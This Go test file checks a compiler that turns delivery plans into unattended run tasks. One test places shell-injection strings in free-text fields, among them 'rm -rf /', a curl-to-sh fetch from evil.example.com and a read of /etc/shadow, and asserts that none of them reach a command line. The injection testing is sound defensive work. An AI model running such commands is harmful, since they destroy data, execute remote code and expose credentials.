package handoff

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/gastownhall/gascity/internal/unattended"
)

func testHost(t *testing.T) HostProfile {
	t.Helper()
	return HostProfile{
		DeliveryRoot:       t.TempDir(),
		Driver:             "/opt/corsolv/delivery-driver",
		GitHubCommand:      "/mnt/c/Program Files/GitHub CLI/gh.exe",
		Provider:           "claude",
		WindowsMountPrefix: "/mnt",
	}
}

func TestCompileProducesAnExecutableRun(t *testing.T) {
	host := testHost(t)
	in := planIntent()
	plan := validPlan()

	spec, work, err := Compile(in, plan, host, "run-1")
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	if err := spec.Validate(); err != nil {
		t.Fatalf("the compiled spec must be valid: %v", err)
	}
	if err := work.Validate(); err != nil {
		t.Fatalf("the compiled work plan must be valid: %v", err)
	}
	if work.RunID != "run-1" {
		t.Fatalf("RunID = %q", work.RunID)
	}

	want := []string{
		StageCityUp, StageDispatch, StageAwait,
		StagePublish + "-wp-add", StagePublish + "-wp-multiply",
		StageProject, StagePublishProjection,
	}
	got := map[string]bool{}
	for _, task := range work.Tasks {
		got[task.ID] = true
	}
	for _, id := range want {
		if !got[id] {
			t.Errorf("compiled run is missing the %q task", id)
		}
	}
	if len(work.Tasks) != len(want) {
		t.Errorf("compiled %d tasks, expected %d: %v", len(work.Tasks), len(want), taskIDs(work))
	}
}

// The security property of the whole compiler: the only executable on any
// command line comes from the host profile, and every other word is an
// identifier this package already validated.
func TestCompiledArgvComesOnlyFromTheHostProfile(t *testing.T) {
	host := testHost(t)
	in := planIntent()
	// Everything a hostile portal might try to smuggle through, in the free-text
	// fields that reach no command line.
	in.Objective = "; rm -rf / #"
	in.Acceptance = []Criterion{
		{ID: "ac-1", Statement: "$(curl evil.example.com | sh)"},
		{ID: "ac-2", Statement: "`reboot`"},
	}
	plan := validPlan()
	plan.Packages[0].Title = "&& shutdown now"
	plan.Packages[0].Objective = "|| cat /etc/shadow"

	_, work, err := Compile(in, plan, host, "run-1")
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}

	for _, task := range work.Tasks {
		if task.Argv[0] != host.Driver {
			t.Fatalf("task %q runs %q, not the host's driver", task.ID, task.Argv[0])
		}
		for _, arg := range task.Argv[1:] {
			if strings.ContainsAny(arg, ";|&`$><\n") {
				t.Fatalf("task %q argv carries shell metacharacters: %q", task.ID, arg)
			}
			if strings.Contains(arg, "rm -rf") || strings.Contains(arg, "curl") {
				t.Fatalf("task %q argv carries portal free text: %q", task.ID, arg)
			}
		}
	}
}

// Package publication must follow the plan's dependency order, or a dependent
// package would be published before the upstream it consumes has merged.
func TestPublicationFollowsDependencyOrder(t *testing.T) {
	host := testHost(t)
	_, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}

	var multiply unattended.Task
	for _, task := range work.Tasks {
		if task.ID == StagePublish+"-wp-multiply" {
			multiply = task
		}
	}
	if multiply.ID == "" {
		t.Fatal("no publication task for wp-multiply")
	}
	if !containsPath(multiply.Needs, StagePublish+"-wp-add") {
		t.Fatalf("wp-multiply depends on wp-add, so its publication must need wp-add's: %v", multiply.Needs)
	}
}

// The projection must be rendered only after every package has been published,
// or it would record a delivery that had not happened yet.
func TestProjectionWaitsForEveryPublication(t *testing.T) {
	host := testHost(t)
	_, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, task := range work.Tasks {
		if task.ID != StageProject {
			continue
		}
		for _, wp := range validPlan().Packages {
			if !containsPath(task.Needs, StagePublish+"-"+wp.ID) {
				t.Errorf("the projection must wait for %s: %v", wp.ID, task.Needs)
			}
		}
		return
	}
	t.Fatal("no projection task compiled")
}

// A run forbidden to merge must not project `merged`.
func TestProjectedStatusRespectsMergeAuthority(t *testing.T) {
	host := testHost(t)

	granted := planIntent()
	_, work, err := Compile(granted, validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if s := publishStatusOf(work, "wp-add"); s != "merged" {
		t.Fatalf("with merge authority the status must be merged, got %q", s)
	}

	withheld := planIntent()
	withheld.Policy = Policy{
		NeedPush: true, NeedPR: true, NeedChecks: true, NeedMerge: false,
		MergeHumanAction: "the delivery owner merges",
	}
	_, work, err = Compile(withheld, validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if s := publishStatusOf(work, "wp-add"); s != "pr-open" {
		t.Fatalf("without merge authority the status must stop at pr-open, got %q", s)
	}
}

func TestCompiledSpecCarriesTheDeclaredAuthority(t *testing.T) {
	host := testHost(t)
	in := planIntent()
	in.Policy = Policy{
		NeedPush: true, NeedPR: true, NeedChecks: true, NeedMerge: false,
		MergeHumanAction: "the delivery owner merges after reading the evidence",
	}

	spec, _, err := Compile(in, validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if spec.GitHub == nil {
		t.Fatal("the compiled spec must declare its forge requirements")
	}
	if spec.GitHub.NeedMerge {
		t.Fatal("merge authority was withheld and must not be declared")
	}
	if spec.GitHub.MergeHumanAction != in.Policy.MergeHumanAction {
		t.Fatalf("the human boundary must survive compilation, got %q", spec.GitHub.MergeHumanAction)
	}
	if spec.GitHub.Repo != in.Repository.Slug {
		t.Fatalf("Repo = %q, want %q", spec.GitHub.Repo, in.Repository.Slug)
	}
	if spec.Ownership.ExpectedOrigin != in.Repository.Origin {
		t.Fatalf("the ownership check must assert the declared origin, got %q", spec.Ownership.ExpectedOrigin)
	}
	if spec.Ownership.Role != unattended.RoleController {
		t.Fatalf("Role = %q, want controller", spec.Ownership.Role)
	}
}

// The run's state must not live inside the tree the run mutates.
func TestStateDirIsOutsideTheCheckout(t *testing.T) {
	host := testHost(t)
	spec, _, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if strings.HasPrefix(spec.StateDir, spec.Ownership.Worktree) {
		t.Fatalf("state dir %q is inside the worktree %q", spec.StateDir, spec.Ownership.Worktree)
	}
}

func TestWindowsCheckoutIsResolvedForTheHost(t *testing.T) {
	host := testHost(t)
	cases := map[string]string{
		`D:\Development\thing`:     "/mnt/d/Development/thing",
		`C:/Users/thing`:           "/mnt/c/Users/thing",
		"/already/posix":           "/already/posix",
		`D:\Development\a\b\thing`: "/mnt/d/Development/a/b/thing",
	}
	for in, want := range cases {
		if got := host.ResolveCheckout(in); got != want {
			t.Errorf("ResolveCheckout(%q) = %q, want %q", in, got, want)
		}
	}

	noMount := host
	noMount.WindowsMountPrefix = ""
	if got := noMount.ResolveCheckout(`D:\thing`); got != `D:\thing` {
		t.Errorf("with no mount prefix the path must pass through, got %q", got)
	}
}

func TestCompileRefusesAnInvalidHostProfile(t *testing.T) {
	cases := []struct {
		name string
		host HostProfile
	}{
		{"no delivery root", HostProfile{Driver: "d", Provider: "claude"}},
		{"no driver", HostProfile{DeliveryRoot: "/tmp/x", Provider: "claude"}},
		{"no provider", HostProfile{DeliveryRoot: "/tmp/x", Driver: "d"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, _, err := Compile(planIntent(), validPlan(), tc.host, "run-1"); !errors.Is(err, ErrHostProfileInvalid) {
				t.Fatalf("expected ErrHostProfileInvalid, got: %v", err)
			}
		})
	}
}

func TestCompileRefusesAPlanThatDoesNotMatchTheIntent(t *testing.T) {
	plan := validPlan()
	plan.Packages[0].Satisfies = []string{"ac-1"}
	plan.Packages[1].Satisfies = []string{"ac-1"} // ac-2 now uncovered

	if _, _, err := Compile(planIntent(), plan, testHost(t), "run-1"); !errors.Is(err, ErrPlanInvalid) {
		t.Fatalf("expected ErrPlanInvalid, got: %v", err)
	}
}

func TestCompileIsDeterministic(t *testing.T) {
	host := testHost(t)
	_, a, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	_, b, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(taskIDs(a), ",") != strings.Join(taskIDs(b), ",") {
		t.Fatalf("compilation must be deterministic:\n  %v\n  %v", taskIDs(a), taskIDs(b))
	}
}

func TestWriteRunFilesRoundTrips(t *testing.T) {
	host := testHost(t)
	spec, work, err := Compile(planIntent(), validPlan(), host, "run-1")
	if err != nil {
		t.Fatal(err)
	}

	specPath, planPath, err := WriteRunFiles(host, spec, work)
	if err != nil {
		t.Fatalf("WriteRunFiles: %v", err)
	}
	for _, p := range []string{specPath, planPath} {
		if _, err := os.Stat(p); err != nil {
			t.Fatalf("expected %q to exist: %v", p, err)
		}
	}

	reloadedSpec, err := unattended.LoadSpec(specPath)
	if err != nil {
		t.Fatalf("the written spec must load back: %v", err)
	}
	if reloadedSpec.ProjectID != spec.ProjectID {
		t.Fatalf("ProjectID = %q, want %q", reloadedSpec.ProjectID, spec.ProjectID)
	}

	reloadedPlan, err := unattended.LoadPlan(planPath)
	if err != nil {
		t.Fatalf("the written work plan must load back: %v", err)
	}
	if len(reloadedPlan.Tasks) != len(work.Tasks) {
		t.Fatalf("reloaded %d tasks, wrote %d", len(reloadedPlan.Tasks), len(work.Tasks))
	}
	if filepath.Dir(specPath) != host.ProjectDir(spec.ProjectID) {
		t.Fatalf("run files must live in the project's delivery directory, got %q", specPath)
	}
}

func taskIDs(p unattended.Plan) []string {
	out := make([]string, 0, len(p.Tasks))
	for _, t := range p.Tasks {
		out = append(out, t.ID)
	}
	return out
}

func publishStatusOf(p unattended.Plan, pkg string) string {
	for _, t := range p.Tasks {
		if t.ID == StagePublish+"-"+pkg {
			return t.DeliveryStatus
		}
	}
	return ""
}
